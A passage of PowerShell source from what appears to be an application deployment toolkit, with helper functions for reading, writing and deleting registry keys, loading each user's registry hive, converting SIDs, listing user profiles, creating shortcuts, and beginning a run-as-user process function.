		[ValidateNotNullOrEmpty()]$Value,
		[Parameter(Mandatory=$false,Position=2)]
		[ValidateNotNullorEmpty()]
		[string]$SID
	)

	Begin {
		
		[string]${CmdletName} = $PSCmdlet.MyInvocation.MyCommand.Name
		Write-FunctionHeaderOrFooter -CmdletName ${CmdletName} -CmdletBoundParameters $PSBoundParameters -Header
	}
	Process {
		
		Try {
			If ($PSBoundParameters.ContainsKey('SID')) {
				[string]$Key = Convert-RegistryPath -Key $Key -SID $SID
			}
			Else {
				[string]$Key = Convert-RegistryPath -Key $Key
			}
		}
		Catch {
			Throw
		}
		[boolean]$IsRegistryValueExists = $false
		Try {
			If (Test-Path -LiteralPath $Key -ErrorAction 'Stop') {
				[string[]]$PathProperties = Get-Item -LiteralPath $Key -ErrorAction 'Stop' | Select-Object -ExpandProperty 'Property' -ErrorAction 'Stop'
				If ($PathProperties -contains $Value) { $IsRegistryValueExists = $true }
			}
		}
		Catch { }

		If ($IsRegistryValueExists) {
			Write-Log -Message "Registry key value [$Key] [$Value] does exist." -Source ${CmdletName}
		}
		Else {
			Write-Log -Message "Registry key value [$Key] [$Value] does not exist." -Source ${CmdletName}
		}
		Write-Output -InputObject $IsRegistryValueExists
	}
	End {
		Write-FunctionHeaderOrFooter -CmdletName ${CmdletName} -Footer
	}
}




Function Get-RegistryKey {

	[CmdletBinding()]
	Param (
		[Parameter(Mandatory=$true)]
		[ValidateNotNullorEmpty()]
		[string]$Key,
		[Parameter(Mandatory=$false)]
		[ValidateNotNullOrEmpty()]
		[string]$Value,
		[Parameter(Mandatory=$false)]
		[ValidateNotNullorEmpty()]
		[string]$SID,
		[Parameter(Mandatory=$false)]
		[ValidateNotNullorEmpty()]
		[switch]$ReturnEmptyKeyIfExists = $false,
		[Parameter(Mandatory=$false)]
		[ValidateNotNullorEmpty()]
		[switch]$DoNotExpandEnvironmentNames = $false,
		[Parameter(Mandatory=$false)]
		[ValidateNotNullOrEmpty()]
		[boolean]$ContinueOnError = $true
	)

	Begin {
		
		[string]${CmdletName} = $PSCmdlet.MyInvocation.MyCommand.Name
		Write-FunctionHeaderOrFooter -CmdletName ${CmdletName} -CmdletBoundParameters $PSBoundParameters -Header
	}
	Process {
		Try {
			
			If ($PSBoundParameters.ContainsKey('SID')) {
				[string]$key = Convert-RegistryPath -Key $key -SID $SID
			}
			Else {
				[string]$key = Convert-RegistryPath -Key $key
			}

			
			If (-not (Test-Path -LiteralPath $key -ErrorAction 'Stop')) {
				Write-Log -Message "Registry key [$key] does not exist. Return `$null." -Severity 2 -Source ${CmdletName}
				$regKeyValue = $null
			}
			Else {
				If ($PSBoundParameters.ContainsKey('Value')) {
					Write-Log -Message "Get registry key [$key] value [$value]." -Source ${CmdletName}
				}
				Else {
					Write-Log -Message "Get registry key [$key] and all property values." -Source ${CmdletName}
				}

				
				$regKeyValue = Get-ItemProperty -LiteralPath $key -ErrorAction 'Stop'
				[int32]$regKeyValuePropertyCount = $regKeyValue | Measure-Object | Select-Object -ExpandProperty 'Count'

				
				If ($PSBoundParameters.ContainsKey('Value')) {
					
					[boolean]$IsRegistryValueExists = $false
					If ($regKeyValuePropertyCount -gt 0) {
						Try {
							[string[]]$PathProperties = Get-Item -LiteralPath $Key -ErrorAction 'Stop' | Select-Object -ExpandProperty 'Property' -ErrorAction 'Stop'
							If ($PathProperties -contains $Value) { $IsRegistryValueExists = $true }
						}
						Catch { }
					}

					
					If ($IsRegistryValueExists) {
						If ($DoNotExpandEnvironmentNames) { 
							If ($Value -like '(Default)') {
								$regKeyValue = $(Get-Item -LiteralPath $key -ErrorAction 'Stop').GetValue($null,$null,[Microsoft.Win32.RegistryValueOptions]::DoNotExpandEnvironmentNames)
							}
							Else {
								$regKeyValue = $(Get-Item -LiteralPath $key -ErrorAction 'Stop').GetValue($Value,$null,[Microsoft.Win32.RegistryValueOptions]::DoNotExpandEnvironmentNames)
							}
						}
						ElseIf ($Value -like '(Default)') {
							$regKeyValue = $(Get-Item -LiteralPath $key -ErrorAction 'Stop').GetValue($null)
						}
						Else {
							$regKeyValue = $regKeyValue | Select-Object -ExpandProperty $Value -ErrorAction 'SilentlyContinue'
						}
					}
					Else {
						Write-Log -Message "Registry key value [$Key] [$Value] does not exist. Return `$null." -Source ${CmdletName}
						$regKeyValue = $null
					}
				}
				
				Else {
					If ($regKeyValuePropertyCount -eq 0) {
						If ($ReturnEmptyKeyIfExists) {
							Write-Log -Message "No property values found for registry key. Return empty registry key object [$key]." -Source ${CmdletName}
							$regKeyValue = Get-Item -LiteralPath $key -Force -ErrorAction 'Stop'
						}
						Else {
							Write-Log -Message "No property values found for registry key. Return `$null." -Source ${CmdletName}
							$regKeyValue = $null
						}
					}
				}
			}
			Write-Output -InputObject ($regKeyValue)
		}
		Catch {
			If (-not $Value) {
				Write-Log -Message "Failed to read registry key [$key]. `n$(Resolve-Error)" -Severity 3 -Source ${CmdletName}
				If (-not $ContinueOnError) {
					Throw "Failed to read registry key [$key]: $($_.Exception.Message)"
				}
			}
			Else {
				Write-Log -Message "Failed to read registry key [$key] value [$value]. `n$(Resolve-Error)" -Severity 3 -Source ${CmdletName}
				If (-not $ContinueOnError) {
					Throw "Failed to read registry key [$key] value [$value]: $($_.Exception.Message)"
				}
			}
		}
	}
	End {
		Write-FunctionHeaderOrFooter -CmdletName ${CmdletName} -Footer
	}
}




Function Set-RegistryKey {

	[CmdletBinding()]
	Param (
		[Parameter(Mandatory=$true)]
		[ValidateNotNullorEmpty()]
		[string]$Key,
		[Parameter(Mandatory=$false)]
		[ValidateNotNullOrEmpty()]
		[string]$Name,
		[Parameter(Mandatory=$false)]
		$Value,
		[Parameter(Mandatory=$false)]
		[ValidateSet('Binary','DWord','ExpandString','MultiString','None','QWord','String','Unknown')]
		[Microsoft.Win32.RegistryValueKind]$Type = 'String',
		[Parameter(Mandatory=$false)]
		[ValidateNotNullorEmpty()]
		[string]$SID,
		[Parameter(Mandatory=$false)]
		[ValidateNotNullOrEmpty()]
		[boolean]$ContinueOnError = $true
	)

	Begin {
		
		[string]${CmdletName} = $PSCmdlet.MyInvocation.MyCommand.Name
		Write-FunctionHeaderOrFooter -CmdletName ${CmdletName} -CmdletBoundParameters $PSBoundParameters -Header
	}
	Process {
		Try {
			[string]$RegistryValueWriteAction = 'set'

			
			If ($PSBoundParameters.ContainsKey('SID')) {
				[string]$key = Convert-RegistryPath -Key $key -SID $SID
			}
			Else {
				[string]$key = Convert-RegistryPath -Key $key
			}

			
			If (-not (Test-Path -LiteralPath $key -ErrorAction 'Stop')) {
				Try {
					Write-Log -Message "Create registry key [$key]." -Source ${CmdletName}
					
					If ((($Key -split '/').Count - 1) -eq 0)
					{
						$null = New-Item -Path $key -ItemType 'Registry' -Force -ErrorAction 'Stop'
					}
					
					Else
					{
						[string]$CreateRegkeyResult = & reg.exe Add "$($Key.Substring($Key.IndexOf('::') + 2))"
						If ($global:LastExitCode -ne 0)
						{
							Throw "Failed to create registry key [$Key]"
						}
					}
				}
				Catch {
					Throw
				}
			}

			If ($Name) {
				
				If (-not (Get-ItemProperty -LiteralPath $key -Name $Name -ErrorAction 'SilentlyContinue')) {
					Write-Log -Message "Set registry key value: [$key] [$name = $value]." -Source ${CmdletName}
					$null = New-ItemProperty -LiteralPath $key -Name $name -Value $value -PropertyType $Type -ErrorAction 'Stop'
				}
				
				Else {
					[string]$RegistryValueWriteAction = 'update'
					If ($Name -eq '(Default)') {
						
						$null = $(Get-Item -LiteralPath $key -ErrorAction 'Stop').OpenSubKey('','ReadWriteSubTree').SetValue($null,$value)
					}
					Else {
						Write-Log -Message "Update registry key value: [$key] [$name = $value]." -Source ${CmdletName}
						$null = Set-ItemProperty -LiteralPath $key -Name $name -Value $value -ErrorAction 'Stop'
					}
				}
			}
		}
		Catch {
			If ($Name) {
				Write-Log -Message "Failed to $RegistryValueWriteAction value [$value] for registry key [$key] [$name]. `n$(Resolve-Error)" -Severity 3 -Source ${CmdletName}
				If (-not $ContinueOnError) {
					Throw "Failed to $RegistryValueWriteAction value [$value] for registry key [$key] [$name]: $($_.Exception.Message)"
				}
			}
			Else {
				Write-Log -Message "Failed to set registry key [$key]. `n$(Resolve-Error)" -Severity 3 -Source ${CmdletName}
				If (-not $ContinueOnError) {
					Throw "Failed to set registry key [$key]: $($_.Exception.Message)"
				}
			}
		}
	}
	End {
		Write-FunctionHeaderOrFooter -CmdletName ${CmdletName} -Footer
	}
}




Function Remove-RegistryKey {

	[CmdletBinding()]
	Param (
		[Parameter(Mandatory=$true)]
		[ValidateNotNullorEmpty()]
		[string]$Key,
		[Parameter(Mandatory=$false)]
		[ValidateNotNullOrEmpty()]
		[string]$Name,
		[Parameter(Mandatory=$false)]
		[switch]$Recurse,
		[Parameter(Mandatory=$false)]
		[ValidateNotNullorEmpty()]
		[string]$SID,
		[Parameter(Mandatory=$false)]
		[ValidateNotNullOrEmpty()]
		[boolean]$ContinueOnError = $true
	)

	Begin {
		
		[string]${CmdletName} = $PSCmdlet.MyInvocation.MyCommand.Name
		Write-FunctionHeaderOrFooter -CmdletName ${CmdletName} -CmdletBoundParameters $PSBoundParameters -Header
	}
	Process {
		Try {
			
			If ($PSBoundParameters.ContainsKey('SID')) {
				[string]$Key = Convert-RegistryPath -Key $Key -SID $SID
			}
			Else {
				[string]$Key = Convert-RegistryPath -Key $Key
			}

			If (-not ($Name)) {
				If (Test-Path -LiteralPath $Key -ErrorAction 'Stop') {
					If ($Recurse) {
						Write-Log -Message "Delete registry key recursively [$Key]." -Source ${CmdletName}
						$null = Remove-Item -LiteralPath $Key -Force -Recurse -ErrorAction 'Stop'
					}
					Else {
						If ($null -eq (Get-ChildItem -LiteralPath $Key -ErrorAction 'Stop')){
							
							Write-Log -Message "Delete registry key [$Key]." -Source ${CmdletName}
							$null = Remove-Item -LiteralPath $Key -Force -ErrorAction 'Stop'
						}
						Else {
							Throw "Unable to delete child key(s) of [$Key] without [-Recurse] switch."
						}
					}
				}
				Else {
					Write-Log -Message "Unable to delete registry key [$Key] because it does not exist." -Severity 2 -Source ${CmdletName}
				}
			}
			Else {
				If (Test-Path -LiteralPath $Key -ErrorAction 'Stop') {
					Write-Log -Message "Delete registry value [$Key] [$Name]." -Source ${CmdletName}

					If ($Name -eq '(Default)') {
						
						$null = (Get-Item -LiteralPath $Key -ErrorAction 'Stop').OpenSubKey('','ReadWriteSubTree').DeleteValue('')
					}
					Else {
						$null = Remove-ItemProperty -LiteralPath $Key -Name $Name -Force -ErrorAction 'Stop'
					}
				}
				Else {
					Write-Log -Message "Unable to delete registry value [$Key] [$Name] because registry key does not exist." -Severity 2 -Source ${CmdletName}
				}
			}
		}
		Catch [System.Management.Automation.PSArgumentException] {
			Write-Log -Message "Unable to delete registry value [$Key] [$Name] because it does not exist." -Severity 2 -Source ${CmdletName}
		}
		Catch {
			If (-not ($Name)) {
				Write-Log -Message "Failed to delete registry key [$Key]. `n$(Resolve-Error)" -Severity 3 -Source ${CmdletName}
				If (-not $ContinueOnError) {
					Throw "Failed to delete registry key [$Key]: $($_.Exception.Message)"
				}
			}
			Else {
				Write-Log -Message "Failed to delete registry value [$Key] [$Name]. `n$(Resolve-Error)" -Severity 3 -Source ${CmdletName}
				If (-not $ContinueOnError) {
					Throw "Failed to delete registry value [$Key] [$Name]: $($_.Exception.Message)"
				}
			}
		}
	}
	End {
		Write-FunctionHeaderOrFooter -CmdletName ${CmdletName} -Footer
	}
}




Function Invoke-HKCURegistrySettingsForAllUsers {

	[CmdletBinding()]
	Param (
		[Parameter(Mandatory=$true)]
		[ValidateNotNullorEmpty()]
		[scriptblock]$RegistrySettings,
		[Parameter(Mandatory=$false)]
		[ValidateNotNullorEmpty()]
		[psobject[]]$UserProfiles = (Get-UserProfiles)
	)

	Begin {
		
		[string]${CmdletName} = $PSCmdlet.MyInvocation.MyCommand.Name
		Write-FunctionHeaderOrFooter -CmdletName ${CmdletName} -CmdletBoundParameters $PSBoundParameters -Header
	}
	Process {
		ForEach ($UserProfile in $UserProfiles) {
			Try {
				
				[string]$UserRegistryPath = "Registry::HKEY_USERS\$($UserProfile.SID)"

				
				[string]$UserRegistryHiveFile = Join-Path -Path $UserProfile.ProfilePath -ChildPath 'NTUSER.DAT'

				
				[boolean]$ManuallyLoadedRegHive = $false
				If (-not (Test-Path -LiteralPath $UserRegistryPath)) {
					
					If (Test-Path -LiteralPath $UserRegistryHiveFile -PathType 'Leaf') {
						Write-Log -Message "Load the User [$($UserProfile.NTAccount)] registry hive in path [HKEY_USERS\$($UserProfile.SID)]." -Source ${CmdletName}
						[string]$HiveLoadResult = & reg.exe load "`"HKEY_USERS\$($UserProfile.SID)`"" "`"$UserRegistryHiveFile`""

						If ($global:LastExitCode -ne 0) {
							Throw "Failed to load the registry hive for User [$($UserProfile.NTAccount)] with SID [$($UserProfile.SID)]. Failure message [$HiveLoadResult]. Continue..."
						}

						[boolean]$ManuallyLoadedRegHive = $true
					}
					Else {
						Throw "Failed to find the registry hive file [$UserRegistryHiveFile] for User [$($UserProfile.NTAccount)] with SID [$($UserProfile.SID)]. Continue..."
					}
				}
				Else {
					Write-Log -Message "The User [$($UserProfile.NTAccount)] registry hive is already loaded in path [HKEY_USERS\$($UserProfile.SID)]." -Source ${CmdletName}
				}

				
				
				
				Write-Log -Message 'Execute ScriptBlock to modify HKCU registry settings for all users.' -Source ${CmdletName}
				& $RegistrySettings
			}
			Catch {
				Write-Log -Message "Failed to modify the registry hive for User [$($UserProfile.NTAccount)] with SID [$($UserProfile.SID)] `n$(Resolve-Error)" -Severity 3 -Source ${CmdletName}
			}
			Finally {
				If ($ManuallyLoadedRegHive) {
					Try {
						Write-Log -Message "Unload the User [$($UserProfile.NTAccount)] registry hive in path [HKEY_USERS\$($UserProfile.SID)]." -Source ${CmdletName}
						[string]$HiveLoadResult = & reg.exe unload "`"HKEY_USERS\$($UserProfile.SID)`""

						If ($global:LastExitCode -ne 0) {
							Write-Log -Message "REG.exe failed to unload the registry hive and exited with exit code [$($global:LastExitCode)]. Performing manual garbage collection to ensure successful unloading of registry hive." -Severity 2 -Source ${CmdletName}
							[GC]::Collect()
							[GC]::WaitForPendingFinalizers()
							Start-Sleep -Seconds 5

							Write-Log -Message "Unload the User [$($UserProfile.NTAccount)] registry hive in path [HKEY_USERS\$($UserProfile.SID)]." -Source ${CmdletName}
							[string]$HiveLoadResult = & reg.exe unload "`"HKEY_USERS\$($UserProfile.SID)`""
							If ($global:LastExitCode -ne 0) { Throw "REG.exe failed with exit code [$($global:LastExitCode)] and result [$HiveLoadResult]." }
						}
					}
					Catch {
						Write-Log -Message "Failed to unload the registry hive for User [$($UserProfile.NTAccount)] with SID [$($UserProfile.SID)]. `n$(Resolve-Error)" -Severity 3 -Source ${CmdletName}
					}
				}
			}
		}
	}
	End {
		Write-FunctionHeaderOrFooter -CmdletName ${CmdletName} -Footer
	}
}




Function ConvertTo-NTAccountOrSID {

	[CmdletBinding()]
	Param (
		[Parameter(Mandatory=$true,ParameterSetName='NTAccountToSID',ValueFromPipelineByPropertyName=$true)]
		[ValidateNotNullOrEmpty()]
		[string]$AccountName,
		[Parameter(Mandatory=$true,ParameterSetName='SIDToNTAccount',ValueFromPipelineByPropertyName=$true)]
		[ValidateNotNullOrEmpty()]
		[string]$SID,
		[Parameter(Mandatory=$true,ParameterSetName='WellKnownName',ValueFromPipelineByPropertyName=$true)]
		[ValidateNotNullOrEmpty()]
		[string]$WellKnownSIDName,
		[Parameter(Mandatory=$false,ParameterSetName='WellKnownName')]
		[ValidateNotNullOrEmpty()]
		[switch]$WellKnownToNTAccount
	)

	Begin {
		
		[string]${CmdletName} = $PSCmdlet.MyInvocation.MyCommand.Name
		Write-FunctionHeaderOrFooter -CmdletName ${CmdletName} -CmdletBoundParameters $PSBoundParameters -Header
	}
	Process {
		Try {
			Switch ($PSCmdlet.ParameterSetName) {
				'SIDToNTAccount' {
					[string]$msg = "the SID [$SID] to an NT Account name"
					Write-Log -Message "Convert $msg." -Source ${CmdletName}

					$NTAccountSID = New-Object -TypeName 'System.Security.Principal.SecurityIdentifier' -ArgumentList $SID
					$NTAccount = $NTAccountSID.Translate([Security.Principal.NTAccount])
					Write-Output -InputObject $NTAccount
				}
				'NTAccountToSID' {
					[string]$msg = "the NT Account [$AccountName] to a SID"
					Write-Log -Message "Convert $msg." -Source ${CmdletName}

					$NTAccount = New-Object -TypeName 'System.Security.Principal.NTAccount' -ArgumentList $AccountName
					$NTAccountSID = $NTAccount.Translate([Security.Principal.SecurityIdentifier])
					Write-Output -InputObject $NTAccountSID
				}
				'WellKnownName' {
					If ($WellKnownToNTAccount) {
						[string]$ConversionType = 'NTAccount'
					}
					Else {
						[string]$ConversionType = 'SID'
					}
					[string]$msg = "the Well Known SID Name [$WellKnownSIDName] to a $ConversionType"
					Write-Log -Message "Convert $msg." -Source ${CmdletName}

					
					Try {
						$MachineRootDomain = (Get-WmiObject -Class 'Win32_ComputerSystem' -ErrorAction 'Stop').Domain.ToLower()
						$ADDomainObj = New-Object -TypeName 'System.DirectoryServices.DirectoryEntry' -ArgumentList "LDAP://$MachineRootDomain"
						$DomainSidInBinary = $ADDomainObj.ObjectSid
						$DomainSid = New-Object -TypeName 'System.Security.Principal.SecurityIdentifier' -ArgumentList ($DomainSidInBinary[0], 0)
					}
					Catch {
						Write-Log -Message 'Unable to get Domain SID from Active Directory. Setting Domain SID to $null.' -Severity 2 -Source ${CmdletName}
						$DomainSid = $null
					}

					
					$WellKnownSidType = [Security.Principal.WellKnownSidType]::$WellKnownSIDName
					$NTAccountSID = New-Object -TypeName 'System.Security.Principal.SecurityIdentifier' -ArgumentList ($WellKnownSidType, $DomainSid)

					If ($WellKnownToNTAccount) {
						$NTAccount = $NTAccountSID.Translate([Security.Principal.NTAccount])
						Write-Output -InputObject $NTAccount
					}
					Else {
						Write-Output -InputObject $NTAccountSID
					}
				}
			}
		}
		Catch {
			Write-Log -Message "Failed to convert $msg. It may not be a valid account anymore or there is some other problem. `n$(Resolve-Error)" -Severity 3 -Source ${CmdletName}
		}
	}
	End {
		Write-FunctionHeaderOrFooter -CmdletName ${CmdletName} -Footer
	}
}




Function Get-UserProfiles {

	[CmdletBinding()]
	Param (
		[Parameter(Mandatory=$false)]
		[ValidateNotNullOrEmpty()]
		[string[]]$ExcludeNTAccount,
		[Parameter(Mandatory=$false)]
		[ValidateNotNullOrEmpty()]
		[boolean]$ExcludeSystemProfiles = $true,
		[Parameter(Mandatory=$false)]
		[ValidateNotNullOrEmpty()]
		[switch]$ExcludeDefaultUser = $false
	)

	Begin {
		
		[string]${CmdletName} = $PSCmdlet.MyInvocation.MyCommand.Name
		Write-FunctionHeaderOrFooter -CmdletName ${CmdletName} -CmdletBoundParameters $PSBoundParameters -Header
	}
	Process {
		Try {
			Write-Log -Message 'Get the User Profile Path, User Account SID, and the User Account Name for all users that log onto the machine.' -Source ${CmdletName}

			
			[string]$UserProfileListRegKey = 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList'
			[psobject[]]$UserProfiles = Get-ChildItem -LiteralPath $UserProfileListRegKey -ErrorAction 'Stop' |
			ForEach-Object {
				Get-ItemProperty -LiteralPath $_.PSPath -ErrorAction 'Stop' | Where-Object { ($_.ProfileImagePath) } |
				Select-Object @{ Label = 'NTAccount'; Expression = { $(ConvertTo-NTAccountOrSID -SID $_.PSChildName).Value } }, @{ Label = 'SID'; Expression = { $_.PSChildName } }, @{ Label = 'ProfilePath'; Expression = { $_.ProfileImagePath } }
			}
			If ($ExcludeSystemProfiles) {
				[string[]]$SystemProfiles = 'S-1-5-18', 'S-1-5-19', 'S-1-5-20'
				[psobject[]]$UserProfiles = $UserProfiles | Where-Object { $SystemProfiles -notcontains $_.SID }
			}
			If ($ExcludeNTAccount) {
				[psobject[]]$UserProfiles = $UserProfiles | Where-Object { $ExcludeNTAccount -notcontains $_.NTAccount }
			}

			
			If (-not $ExcludeDefaultUser) {
				[string]$UserProfilesDirectory = Get-ItemProperty -LiteralPath $UserProfileListRegKey -Name 'ProfilesDirectory' -ErrorAction 'Stop' | Select-Object -ExpandProperty 'ProfilesDirectory'

				
				If (([version]$envOSVersion).Major -gt 5) {
					
					[string]$DefaultUserProfileDirectory = Get-ItemProperty -LiteralPath $UserProfileListRegKey -Name 'Default' -ErrorAction 'Stop' | Select-Object -ExpandProperty 'Default'
				}
				
				Else {
					
					[string]$DefaultUserProfileName = Get-ItemProperty -LiteralPath $UserProfileListRegKey -Name 'DefaultUserProfile' -ErrorAction 'Stop' | Select-Object -ExpandProperty 'DefaultUserProfile'

					
					[string]$DefaultUserProfileDirectory = Join-Path -Path $UserProfilesDirectory -ChildPath $DefaultUserProfileName
				}

				
				
				
				[psobject]$DefaultUserProfile = New-Object -TypeName 'PSObject' -Property @{
					NTAccount = 'Default User'
					SID = 'S-1-5-21-Default-User'
					ProfilePath = $DefaultUserProfileDirectory
				}

				
				$UserProfiles += $DefaultUserProfile
			}

			Write-Output -InputObject $UserProfiles
		}
		Catch {
			Write-Log -Message "Failed to create a custom object representing all user profiles on the machine. `n$(Resolve-Error)" -Severity 3 -Source ${CmdletName}
		}
	}
	End {
		Write-FunctionHeaderOrFooter -CmdletName ${CmdletName} -Footer
	}
}




Function Get-FileVersion {

	[CmdletBinding()]
	Param (
		[Parameter(Mandatory=$true)]
		[ValidateNotNullorEmpty()]
		[string]$File,
		[Parameter(Mandatory=$false)]
		[ValidateNotNullOrEmpty()]
		[boolean]$ContinueOnError = $true
	)

	Begin {
		
		[string]${CmdletName} = $PSCmdlet.MyInvocation.MyCommand.Name
		Write-FunctionHeaderOrFooter -CmdletName ${CmdletName} -CmdletBoundParameters $PSBoundParameters -Header
	}
	Process {
		Try {
			Write-Log -Message "Get file version info for file [$file]." -Source ${CmdletName}

			If (Test-Path -LiteralPath $File -PathType 'Leaf') {
				$fileVersion = (Get-Command -Name $file -ErrorAction 'Stop').FileVersionInfo.FileVersion
				If ($fileVersion) {
					
					$fileVersion = ($fileVersion -split ' ' | Select-Object -First 1)

					Write-Log -Message "File version is [$fileVersion]." -Source ${CmdletName}
					Write-Output -InputObject $fileVersion
				}
				Else {
					Write-Log -Message 'No file version information found.' -Source ${CmdletName}
				}
			}
			Else {
				Throw "File path [$file] does not exist."
			}
		}
		Catch {
			Write-Log -Message "Failed to get file version info. `n$(Resolve-Error)" -Severity 3 -Source ${CmdletName}
			If (-not $ContinueOnError) {
				Throw "Failed to get file version info: $($_.Exception.Message)"
			}
		}
	}
	End {
		Write-FunctionHeaderOrFooter -CmdletName ${CmdletName} -Footer
	}
}




Function New-Shortcut {

	[CmdletBinding()]
	Param (
		[Parameter(Mandatory=$true)]
		[ValidateNotNullorEmpty()]
		[string]$Path,
		[Parameter(Mandatory=$true)]
		[ValidateNotNullorEmpty()]
		[string]$TargetPath,
		[Parameter(Mandatory=$false)]
		[ValidateNotNullOrEmpty()]
		[string]$Arguments,
		[Parameter(Mandatory=$false)]
		[ValidateNotNullorEmpty()]
		[string]$IconLocation,
		[Parameter(Mandatory=$false)]
		[ValidateNotNullorEmpty()]
		[string]$IconIndex,
		[Parameter(Mandatory=$false)]
		[ValidateNotNullOrEmpty()]
		[string]$Description,
		[Parameter(Mandatory=$false)]
		[ValidateNotNullOrEmpty()]
		[string]$WorkingDirectory,
		[Parameter(Mandatory=$false)]
		[ValidateSet('Normal','Maximized','Minimized')]
		[string]$WindowStyle,
		[Parameter(Mandatory=$false)]
		[switch]$RunAsAdmin,
		[Parameter(Mandatory=$false)]
		[ValidateNotNullorEmpty()]
		[string]$Hotkey,
		[Parameter(Mandatory=$false)]
		[ValidateNotNullOrEmpty()]
		[boolean]$ContinueOnError = $true
	)

	Begin {
		
		[string]${CmdletName} = $PSCmdlet.MyInvocation.MyCommand.Name
		Write-FunctionHeaderOrFooter -CmdletName ${CmdletName} -CmdletBoundParameters $PSBoundParameters -Header

		If (-not $Shell) { [__comobject]$Shell = New-Object -ComObject 'WScript.Shell' -ErrorAction 'Stop' }
	}
	Process {
		Try {
			Try {
				[IO.FileInfo]$Path = [IO.FileInfo]$Path
				[string]$PathDirectory = $Path.DirectoryName

				If (-not (Test-Path -LiteralPath $PathDirectory -PathType 'Container' -ErrorAction 'Stop')) {
					Write-Log -Message "Create shortcut directory [$PathDirectory]." -Source ${CmdletName}
					$null = New-Item -Path $PathDirectory -ItemType 'Directory' -Force -ErrorAction 'Stop'
				}
			}
			Catch {
				Write-Log -Message "Failed to create shortcut directory [$PathDirectory]. `n$(Resolve-Error)" -Severity 3 -Source ${CmdletName}
				Throw
			}

			Write-Log -Message "Create shortcut [$($path.FullName)]." -Source ${CmdletName}
			If (($path.FullName).ToLower().EndsWith('.url')) {
				[string[]]$URLFile = '[InternetShortcut]'
				$URLFile += "URL=$targetPath"
				If ($iconIndex) { $URLFile += "IconIndex=$iconIndex" }
				If ($IconLocation) { $URLFile += "IconFile=$iconLocation" }
				$URLFile | Out-File -FilePath $path.FullName -Force -Encoding 'default' -ErrorAction 'Stop'
			}
			ElseIf (($path.FullName).ToLower().EndsWith('.lnk')) {
				If (($iconLocation -and $iconIndex) -and (-not ($iconLocation.Contains(',')))) {
					$iconLocation = $iconLocation + ",$iconIndex"
				}
				Switch ($windowStyle) {
					'Normal' { $windowStyleInt = 1 }
					'Maximized' { $windowStyleInt = 3 }
					'Minimized' { $windowStyleInt = 7 }
					Default { $windowStyleInt = 1 }
				}
				$shortcut = $shell.CreateShortcut($path.FullName)
				$shortcut.TargetPath = $targetPath
				$shortcut.Arguments = $arguments
				$shortcut.Description = $description
				$shortcut.WorkingDirectory = $workingDirectory
				$shortcut.WindowStyle = $windowStyleInt
                If ($hotkey) {$shortcut.Hotkey = $hotkey}
				If ($iconLocation) { $shortcut.IconLocation = $iconLocation }
				$shortcut.Save()

				
				If ($RunAsAdmin) {
					Write-Log -Message 'Set shortcut to run program as administrator.' -Source ${CmdletName}
					$TempFileName = [IO.Path]::GetRandomFileName()
					$TempFile = [IO.FileInfo][IO.Path]::Combine($Path.Directory, $TempFileName)
					$Writer = New-Object -TypeName 'System.IO.FileStream' -ArgumentList ($TempFile, ([IO.FileMode]::Create)) -ErrorAction 'Stop'
					$Reader = $Path.OpenRead()
					While ($Reader.Position -lt $Reader.Length) {
						$Byte = $Reader.ReadByte()
						If ($Reader.Position -eq 22) { $Byte = 34 }
						$Writer.WriteByte($Byte)
					}
					$Reader.Close()
					$Writer.Close()
					$Path.Delete()
					$null = Rename-Item -Path $TempFile -NewName $Path.Name -Force -ErrorAction 'Stop'
				}
			}
		}
		Catch {
			Write-Log -Message "Failed to create shortcut [$($path.FullName)]. `n$(Resolve-Error)" -Severity 3 -Source ${CmdletName}
			If (-not $ContinueOnError) {
				Throw "Failed to create shortcut [$($path.FullName)]: $($_.Exception.Message)"
			}
		}
	}
	End {
		Write-FunctionHeaderOrFooter -CmdletName ${CmdletName} -Footer
	}
}




Function Execute-ProcessAsUser {

	[CmdletBinding()]
	Param (
		[Parameter(Mandatory=$false)]
		[ValidateNotNullorEmpty()]
		[string]$UserName = $RunAsActiveUser.NTAccount,
		[Parameter(Mandatory=$true)]
		[ValidateNotNullorEmpty()]
		[string]$Path,
		[Parameter(Mandatory=$false)]
		[ValidateNotNullorEmpty()]
		[string]$Parameters = '',
		[Parameter(Mandatory=$false)]
		[switch]$SecureParameters = $false,
		[Parameter(Mandatory=$false)]
		[ValidateSet('HighestAvailable','LeastPrivilege')]
		[string]$RunLevel = 'HighestAvailable',
		[Parameter(Mandatory=$false)]
		[ValidateNotNullOrEmpty()]
		[switch]$Wait = $false,
		[Parameter(Mandatory=$false)]
		[switch]$PassThru = $false,
		[Parameter(Mandatory=$false)]
		[ValidateNotNullOrEmpty()]
		[boolean]$ContinueOnError = $true
	)

	Begin {
		
		[string]${CmdletName} = $PSCmdlet.MyInvocation.MyCommand.Name
		Write-FunctionHeaderOrFooter -CmdletName ${CmdletName} -CmdletBoundParameters $PSBoundParameters -Header
	}
	Process {
		
		[int32]$executeProcessAsUserExitCode = 0

		
		If (-not $UserName) {
			[int32]$executeProcessAsUserExitCode = 60009
			Write-Log -Message "The function [${CmdletName}] has a -UserName parameter that has an empty default value because no logged in users were detected when the toolkit was launched." -Severity 3 -Source ${CmdletName}
			If (-not $ContinueOnError) {
				Throw "The function [${CmdletName}] has a -UserName parameter that has an empty default value because no logged in users were detected when the toolkit was launched."
			}
			Else {
				Return
			}
		}

		
		If (($RunLevel -eq 'HighestAvailable') -and (-not $IsAdmin)) {
			[int32]$executeProcessAsUserExitCode = 60003
			Write-Log -Message "The function [${CmdletName}] requires the toolkit to be running with Administrator privileges if the [-RunLevel] parameter is set to 'HighestAvailable'." -Severity 3 -Source ${CmdletName}
			If (-not $ContinueOnError) {
				Throw "The function [${CmdletName}] requires the toolkit to be running with Administrator privileges if the [-RunLevel] parameter is set to 'HighestAvailable'."
			}
			Else {
				Return
			}
		}

		
		[string]$schTaskName = "$appDeployToolkitName-ExecuteAsUser"

		
		If (-not (Test-Path -LiteralPath $dirAppDeployTemp -PathType 'Container')) {
			New-Item -Path $dirAppDeployTemp -ItemType 'Directory' -Force -ErrorAction 'Stop'
		}

		
		If (($Path -eq 'PowerShell.exe') -or ((Split-Path -Path $Path -Leaf) -eq 'PowerShell.exe')) {
			
			If ($($Parameters.Substring($Parameters.Length - 1)) -eq '"') {
				[string]$executeProcessAsUserParametersVBS = 'chr(34) & ' + "`"$($Path)`"" + ' & chr(34) & ' + '" ' + ($Parameters -replace '"', "`" & chr(34) & `"" -replace ' & chr\(34\) & "$', '') + ' & chr(34)' }
			Else {
